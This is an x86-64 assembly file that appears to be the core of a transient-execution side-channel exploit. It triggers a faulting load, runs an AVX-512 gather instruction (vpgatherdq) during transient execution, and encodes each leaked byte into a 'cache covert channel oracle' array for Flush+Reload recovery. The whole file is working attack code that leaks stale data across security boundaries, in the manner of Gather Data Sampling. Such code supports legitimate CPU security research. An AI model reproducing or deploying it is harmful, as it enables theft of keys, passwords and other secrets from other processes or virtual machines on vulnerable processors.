.data

.align 0x1000
    # Allocated for cache covert channel oracle
    .global oracles 
oracles:
    .space 16*4096*256, 0

.align 0x1000
    # Allocated for a dummy memory
    .global address_buffer
address_buffer:
    .space 4096, 0

    .global address_UC
address_UC:
    .space 4096, 0

.text

# Encoding in the cache.
.macro encode_ymm
    .set BYTE_TRY, 16
    .set i,0
    .rept BYTE_TRY/8
    vextracti128 $i/2, %ymm5, %xmm0
    pextrq $i%2, %xmm0, %rax
    
    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    # extracting each byte and encoding it on the cache

    lea oracles+(8*i+0)*256*4096, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    lea oracles+(8*i+1)*256*4096, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    lea oracles+(8*i+2)*256*4096, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    lea oracles+(8*i+3)*256*4096, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax

    lea oracles+(8*i+4)*256*4096, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    lea oracles+(8*i+5)*256*4096, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    lea oracles+(8*i+6)*256*4096, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    lea oracles+(8*i+7)*256*4096, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
    
    .set i,i+1
    .endr 
.endm

.align 0x1000
.global s_load_encode
s_load_encode:  

    # 1 : Increment the transient 
    lfence
    mfence 
    .rept 128
    inc %rax
    //vmovups (%rdi), %ymm3 //PAS AVX 512
    vmovups (%rdi), %zmm3   //AVX 512
    .endr  

    //PAS AVX 512
    //vpxord %ymm1, %ymm1, %ymm1
    //vmovups (%rsi), %ymm1
    //vpcmpeqb %ymm2, %ymm2, %ymm2

    //AVX 512
    vpxord %zmm1, %zmm1, %zmm1
    vmovups (%rsi), %zmm1
    mov $0b1111111111111111, %rdi
    kmovq %rdi, %k1
    kmovq %rdi, %k2

    lea address_buffer, %rdi
    clflush (%rdi)
    mov (%rdi), %rax
    xchg %rax, 0(%rdi)
    mov $0, %rdi
    mov (%rdi), %rax

    mov $0, %r13
    //AVX PAS 512
    //vpgatherdd %ymm2, 0(%r13, %ymm1, 1), %ymm5
    //vpermd %ymm5, %ymm3, %ymm5
    //vmovups %ymm5, (%rsi)

    //AVX 512
    vpgatherdq 0(%r13, %ymm1, 1), %zmm5{%k1} 
    vpermd %zmm5, %zmm3, %zmm5{%k2}

    //mov 0, %rdi

    /*
    rdtscp
    sub %rdi, %rax
    mov %rax, 56(%rsi)    
    */

    encode_ymm
    ret
